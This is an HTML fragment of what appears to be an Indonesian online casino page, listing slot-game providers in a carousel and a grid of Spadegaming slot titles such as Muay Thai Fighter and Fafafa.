                                      <a class="btn-box " href="/slots/hotdog" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/hotdog_slot8510.png" data-src="/assets/game_logos/100x70/hotdog_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HOTDOG GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dst-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/dst_slot8510.png" data-src="/assets/game_logos/100x70/dst_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DST PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/askmeslot" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/askme_slot8510.png" data-src="/assets/game_logos/100x70/askme_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ASKMESLOT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/booming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BOOMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fachai" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fachai_slot8510.png" data-src="/assets/game_logos/100x70/fachai_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FACHAI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/jdb" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jdb_slot8510.png" data-src="/assets/game_logos/100x70/jdb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JDB</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dragoonsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/dragoon_slot8510.png" data-src="/assets/game_logos/100x70/dragoon_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DRAGOON SOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/apollo777" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/apollo777_slot8510.png" data-src="/assets/game_logos/100x70/apollo777_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">APOLLO777</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/5gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/5gaming_slot8510.png" data-src="/assets/game_logos/100x70/5gaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">5GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ygg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/yggslot8510.png" data-src="/assets/game_logos/100x70/yggslot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">YGG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kagaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kagaming_slot8510.png" data-src="/assets/game_logos/100x70/kagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nagagames" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nagagames_slot8510.png" data-src="/assets/game_logos/100x70/nagagames_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NAGA GAMES</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/live22" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/live22_slot8510.png" data-src="/assets/game_logos/100x70/live22_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LIVE22</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/onegame" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/onegame_slot8510.png" data-src="/assets/game_logos/100x70/onegame_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">One Game</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/bgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/bgaming_slot8510.png" data-src="/assets/game_logos/100x70/bgaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BGAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/gmw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/gmw_slot8510.png" data-src="/assets/game_logos/100x70/gmw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">GMW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/uu" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/uu_slot8510.png" data-src="/assets/game_logos/100x70/uu_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">UU Slot</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/i8" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/i8_slot8510.png" data-src="/assets/game_logos/100x70/i8_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">i8</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/pegasus" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/pegasus_slot8510.png" data-src="/assets/game_logos/100x70/pegasus_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PEGASUS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/btg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/btg_slot8510.png" data-src="/assets/game_logos/100x70/btg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BTG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/kingmidas" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kingmaker_slot8510.png" data-src="/assets/game_logos/100x70/kingmaker_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KINGMIDAS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/smartsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/smartsoft_slot8510.png" data-src="/assets/game_logos/100x70/smartsoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SMARTSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/toptrend-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">TOPTREND GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/liteplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/liteplay_slot8510.png" data-src="/assets/game_logos/100x70/liteplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LITEPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/mancalagaming_slot8510.png" data-src="/assets/game_logos/100x70/mancalagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> MANCALA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/eagaming_slot8510.png" data-src="/assets/game_logos/100x70/eagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> EA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/evoplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/evoplay_slot8510.png" data-src="/assets/game_logos/100x70/evoplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">EVOPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/sbo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_slot8510.png" data-src="/assets/game_logos/100x70/sbo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SBO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/568win" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_568win_slot8510.png" data-src="/assets/game_logos/100x70/sbo_568win_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">568 WIN</h5>
              </a>
                           </div>

          
      </div>
    </div>
    <div class="right"><button class="next-btn btn" id="right-button"><i class="icon-keyboard_arrow_right"></i></button></div>


  </div>
</div>


         <div class="row no-gutters filter">
    <div class="col-xs-10 text-center">
      <div class="row">
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="NEW" [ngclass]="{ 'active': filterProperty==FilterType.New  }">BARU</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="TOP" [ngclass]="{ 'active': filterProperty==FilterType.Top  }">TOP</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f active" data-filter="ALL" [ngclass]="{ 'active': filterProperty==FilterType.All  }">SEMUA </button>
        </div>
      </div>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#searchModal"><i class="icon-magnifier"></i></button>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#filterModal-2"><i class="icon-equalizer2"></i></button>
    </div>
  </div>
  <div class="mobile-border"></div>
  <div class="mobile-border"></div>
  <br>
  <input type="hidden" value="sg_slot" name="hiddenGameID-001" id="hiddenGameID-001">
  <div class="row games no-gutters">
          
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legacy of Kong Maxways" data-filter="ALL,TOP,NEW,BUY FREESPIN" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legacy of Kong Maxways', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/b38733b585f7906d26e94b34bdceb0d5.webp?v=0.1' , 'S-LK03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/5f64aae569f06225e9a6dc95df9562ac.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Pixiu">Golden Pixiu</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Muay Thai Fighter" data-filter="ALL,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Muay Thai Fighter', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/f92c2835d77043c50f3964a2b7450189.webp?v=0.1' , 'S-MT01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/f92c2835d77043c50f3964a2b7450189.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Muay Thai Fighter">Muay Thai Fighter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fafafa" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fafafa', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e2696bc7b538330d1bd0a80aa6df221b.webp?v=0.3' , 'S-LY01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e2696bc7b538330d1bd0a80aa6df221b.webp?v=0.3" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fafafa">Fafafa</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Brothers Kingdom 2" data-filter="ALL,NEW,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Brothers Kingdom 2', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/13d560629a0b62390859558504a84452.webp?v=0.1' , 'S-BK01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/13d560629a0b62390859558504a84452.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Brothers Kingdom 2">Brothers Kingdom 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="First Love" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'First Love', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a18737d9ab7cc251c179e71fdc51570e.webp?v=0.1' , 'S-FL02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a18737d9ab7cc251c179e71fdc51570e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="First Love">First Love</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Fortune Dragons" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Fortune Dragons', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/1376d76c92f7dc3637accc770a4a2c6e.webp?v=0.1' , 'S-FD01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/1376d76c92f7dc3637accc770a4a2c6e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Fortune Dragons">5 Fortune Dragons</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rich Caishen" data-filter="ALL,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rich Caishen', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/13a6d59127d7fcef3a31cfe4db1a39f8.webp?v=0.1' , 'S-RC01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/13a6d59127d7fcef3a31cfe4db1a39f8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rich Caishen">Rich Caishen</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mega 7" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mega 7', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/b907465b16955870e1287e6aa599946a.webp?v=0.1' , 'S-MG01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/b907465b16955870e1287e6aa599946a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mega 7">Mega 7</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sexy Vegas" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sexy Vegas', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/7b2a295f044dea6f46b4d72d47dfbe37.webp?v=0.1' , 'S-VB01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/7b2a295f044dea6f46b4d72d47dfbe37.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sexy Vegas">Sexy Vegas</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Poker Ways" data-filter="ALL,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Poker Ways', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/eea331304c9ba93ec31262953ce24d48.webp?v=0.1' , 'S-PW03', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/eea331304c9ba93ec31262953ce24d48.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Poker Ways">Poker Ways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Alchemy Quest Level Up" data-filter="ALL,NEW,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Alchemy Quest Level Up', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/4af64d4c7bf0f72f232a37c786eef843.webp?v=0.1' , 'S-AL02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/4af64d4c7bf0f72f232a37c786eef843.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Alchemy Quest Level Up">Alchemy Quest Level Up</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cai Shen 888" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cai Shen 888', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/93f51f8bf355a02e03b486d687376482.webp?v=0.1' , 'S-CS01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/93f51f8bf355a02e03b486d687376482.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cai Shen 888">Cai Shen 888</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Princess Wang" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Princess Wang', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/cbe5fe657ee3af418e26f291fdb1c41b.webp?v=0.1' , 'S-PW02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/cbe5fe657ee3af418e26f291fdb1c41b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Princess Wang">Princess Wang</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Santa Wild Drop" data-filter="ALL,NEW,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Santa Wild Drop', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/3ebe5c820e1c4e4a49ad4ca9b47c202a.webp?v=0.1' , 'S-SW02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/3ebe5c820e1c4e4a49ad4ca9b47c202a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Santa Wild Drop">Santa Wild Drop</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker&amp;quot;amp;s Treasure" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker&amp;quot;amp;s Treasure', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/e8bcf2506f372e1d4191643e9aff8b0a.webp?v=0.1' , 'S-JT02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/e8bcf2506f372e1d4191643e9aff8b0a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker's Treasure">Joker's Treasure</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fury max lucky road" data-filter="ALL,NEW,BUY FREESPIN,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fury max lucky road', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/aa48e28d4f2899d9e59e2fc1d7518c45.webp?v=0.1' , 'S-FM04', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/aa48e28d4f2899d9e59e2fc1d7518c45.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fury max lucky road">Fury max lucky road</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Farmland Frenzy Maxways" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Farmland Frenzy Maxways', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/c97403c4bfefb8bc98b2c58a016a2472.webp?v=0.1' , 'S-FF01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/c97403c4bfefb8bc98b2c58a016a2472.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Farmland Frenzy Maxways">Farmland Frenzy Maxways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="ZEUS" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'ZEUS', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/3ed32a116db734c84b1cd343ee0283e4.webp?v=0.1' , 'S-ZE01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/3ed32a116db734c84b1cd343ee0283e4.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="ZEUS">ZEUS</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Monkey" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Monkey', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/a4cc6a89689ebed450427794ceea8b6e.webp?v=0.1' , 'S-FM02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/a4cc6a89689ebed450427794ceea8b6e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Monkey">Golden Monkey</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Horse" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Horse', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/8e08d4996fa7ed6a82ce6617c9f7c4eb.webp?v=0.1' , 'S-LH04', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/8e08d4996fa7ed6a82ce6617c9f7c4eb.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Horse">Lucky Horse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Christmas Tree of Wonders" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Christmas Tree of Wonders', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/f851ebf9ad769e3fcc12a4103a369db4.webp?v=0.1' , 'S-CT02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/f851ebf9ad769e3fcc12a4103a369db4.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Christmas Tree of Wonders">Christmas Tree of Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ping Pong Panda" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ping Pong Panda', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/c7a26aa4e390ba86d3171456fb98b276.webp?v=0.1' , 'S-PP02', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/c7a26aa4e390ba86d3171456fb98b276.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ping Pong Panda">Ping Pong Panda</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hallo Win Party" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hallo Win Party', 'https://www.Goblin88.site/assets/games/i/165x220/spadegaming/75bfcc5a24967b2a505c916378bd01d3.webp?v=0.1' , 'S-HP01', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/spadegaming/75bfcc5a24967b2a505c916378bd01d3.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hallo Win Party">Hallo Win Party</h5>
        </a>
        
     
